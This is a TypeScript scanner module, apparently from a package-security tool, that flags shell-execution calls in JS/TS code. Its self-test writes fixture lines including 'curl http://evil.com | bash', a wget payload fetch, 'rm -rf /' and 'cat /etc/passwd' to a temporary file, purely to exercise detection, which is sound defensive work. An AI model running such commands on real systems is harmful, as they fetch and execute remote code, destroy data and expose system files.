/**
 * ═══════════════════════════════════════════════════════════
 *  AEGIS-AST — Execution Detection Scanner
 *  Owner: Person 2 (Security Detection Engine)
 *
 *  Scans JS/TS source files for dangerous execution patterns —
 *  code that spawns shell commands or child processes.
 * ═══════════════════════════════════════════════════════════
 */

import * as fs from 'fs';
import * as path from 'path';
import { walkSourceFiles, isCommentLine, stripInlineComments } from '../utils/file_walker';

// Non-global regexes — safe to reuse per line without resetting lastIndex.
const EXEC_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
  { pattern: /\bchild_process\b/,           label: 'child_process' },
  { pattern: /\bexecSync\s*\(/,             label: 'execSync' },
  { pattern: /\bexecFileSync\s*\(/,         label: 'execFileSync' },
  { pattern: /\bexecFile\s*\(/,             label: 'execFile' },
  { pattern: /\bspawnSync\s*\(/,            label: 'spawnSync' },
  { pattern: /\bspawn\s*\(/,               label: 'spawn' },
  { pattern: /\bshelljs\b/,                label: 'shelljs' },
  { pattern: /\bshell\.exec\s*\(/,         label: 'shell.exec' },
  { pattern: /\bProcessBuilder\b/,         label: 'ProcessBuilder' },
  { pattern: /\bRuntime\.getRuntime\b/,    label: 'Runtime.getRuntime' },
];

// Matches .exec( preceded by a word char, closing paren, or regex literal closing slash
// e.g. pattern.exec(, result).exec(, /regex/.exec( — all safe, not child_process
const REGEX_EXEC_RE = /[\w.)/]\s*\.exec\s*\(/;

/**
 * Returns deduplicated labels for all exec patterns found in a single line.
 * Distinguishes child_process.exec() from RegExp.exec() to avoid false positives
 * on packages like axios and lodash that use regex heavily.
 */
function getMatchedLabels(line: string): string[] {
  const seen = new Set<string>();
  for (const { pattern, label } of EXEC_PATTERNS) {
    if (pattern.test(line) && !seen.has(label)) {
      seen.add(label);
    }
  }

  // Only flag standalone exec( if it's NOT a regex method call
  // e.g. "exec('cmd')" → flag, but "pattern.exec(str)" → skip
  if (!seen.has('child_process') && !seen.has('shell.exec')) {
    // Check for standalone exec( that isn't regex.exec()
    if (/\bexec\s*\(/.test(line) && !REGEX_EXEC_RE.test(line)) {
      seen.add('exec');
    }
  } else if (/\bexec\s*\(/.test(line)) {
    // If child_process is on the same line, it's definitely shell exec
    seen.add('exec');
  }

  return Array.from(seen);
}

/**
 * Scans all JS/TS source files in packageDir for dangerous execution patterns.
 *
 * @param packageDir - Path to the extracted package root
 * @returns Object with `exec` array of human-readable finding strings.
 *          Returns { exec: [] } if nothing found. Never throws.
 */
export async function scanExec(
  packageDir: string
): Promise<{ exec: string[] }> {
  let files;
  try {
    files = walkSourceFiles(packageDir);
  } catch {
    return { exec: [] };
  }

  if (files.length === 0) return { exec: [] };

  const findings: string[] = [];

  for (const file of files) {
    try {
      const lines = file.content.split('\n');
      for (let i = 0; i < lines.length; i++) {
        if (isCommentLine(lines[i])) continue;
        const matchedLabels = getMatchedLabels(stripInlineComments(lines[i]));
        if (matchedLabels.length === 0) continue;

        const trimmed = lines[i].trim();
        findings.push(
          `${file.relativePath}:${i + 1} — ${trimmed} — contains ${matchedLabels.join(', ')}`
        );
      }
    } catch {
      // Skip files that error during processing
    }
  }

  return { exec: findings };
}

// ─── Self-test ────────────────────────────────────────────────────────────────
// Run directly:  npx ts-node src/scanner/exec.ts

if (require.main === module) {
  (async () => {
    const testDir = '/tmp/aegis-exec-test';
    const srcDir = path.join(testDir, 'lib');

    fs.mkdirSync(srcDir, { recursive: true });

    fs.writeFileSync(
      path.join(srcDir, 'index.js'),
      [
        // Clean lines — should NOT be flagged
        `const x = 1 + 1;`,
        `console.log('running setup');`,
        // Suspicious — SHOULD be flagged
        `const { exec } = require('child_process');`,
        `exec('curl http://evil.com | bash', callback);`,
        `execSync('rm -rf /', { stdio: 'inherit' });`,
        `const proc = spawn('bash', ['-c', cmd]);`,
        `spawnSync('wget', ['http://evil.com/payload']);`,
        `execFile('/bin/sh', ['-c', userInput], cb);`,
        `execFileSync('/bin/sh', ['-c', cmd]);`,
        `const shell = require('shelljs');`,
        `shell.exec('cat /etc/passwd');`,
      ].join('\n')
    );

    console.log('Running scanExec on fake malicious package...\n');
    const result = await scanExec(testDir);

    if (result.exec.length === 0) {
      console.log('No findings (unexpected — check patterns)');
    } else {
      for (const finding of result.exec) {
        console.log('  FLAGGED:', finding);
      }
    }

    fs.rmSync(testDir, { recursive: true, force: true });
    console.log('\nCleanup done.');
  })();
}
